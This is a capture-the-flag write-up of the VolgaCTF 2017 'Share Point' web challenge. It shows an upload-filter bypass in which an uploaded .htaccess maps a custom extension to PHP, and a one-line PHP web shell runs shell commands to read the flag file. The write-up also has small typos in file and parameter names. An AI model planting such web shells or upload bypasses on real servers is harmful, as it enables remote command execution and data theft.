# VolgaCTF 2017 Quals: Share Point

**Category:** Web Exploitation
**Points:** 200
**Total Solves:** Not Available
## Problem Description:

[//]: # (> This program is vulnerable to a format string attack! See if you can modify a variable by supplying a format string! The binary can be found at /home/format/ on the shell server. The source can be found [here](format.c\).)

> Look! I wrote a good service for sharing your files with your friends, enjoy. 



## Write-up
[//]: # (> Your write up goes here.)
This problem taught me something new about vulnerability in Apache server. This problems gives us a URL when we goto share-point.quals.2017.volgactf.ru and we see this login page: 
![Image](sharepointVolgaCTF-1.png?raw=true "Login Page")

We login with any user name and password. It gives a page where we can upload files on the server and see it. Natural guess is to upload a .php file and see it do our which is print the flag on server. But it doesn't allow us do upload .php file. Tried uploading .php5 but no help. After trying a lot of things like uploading .png file and files with any other extension tells us that we can see the name of file name in URL as we see the uploaded files. After getting to know this me and Terry are thinking like some how we need to upload a file with .php extension that way we can execute our code in by passing values in URL. After much thinking, looking up on web we realized that on Apache server we have .htaccess file where we can specify the extension of file which should be treated as php file on server side. By default which is .php. After realising this solution is easy. We first uploaded a file .htaccess with content ```AddType application/x-httpd-php .getflag```, what this do is it allow us execute any file with .getflag extension as php file. Now we uploaded a file named myfile.getflat which has following content:

```
<?php

system($_GET['cmmand']);

?>
```

![Image](sharepointVolgaCTF-2.png?raw=true "Login Page")
![Image](sharepointVolgaCTF-3.png?raw=true "Login Page")
![Image](sharepointVolgaCTF-4.png?raw=true "Login Page")

Once our file with php code is uploaded and is ready to executed on server, we go to see the file again and pass arguments to cmmand in url like: command=ls%20/opt. 

![Image](sharepointVolgaCTF-5.png?raw=true "Login Page")
This show that there is flag in /opt and passing the cmmand=cat%20/opt/flag.txt gives the flag: **VolgaCTF{AnoTHer_apPr0Ach_to_file_Up10Ad_with_PhP}**
![Image](sharepointVolgaCTF-6.png?raw=true "Login Page")
## Other write-ups and resources

* None
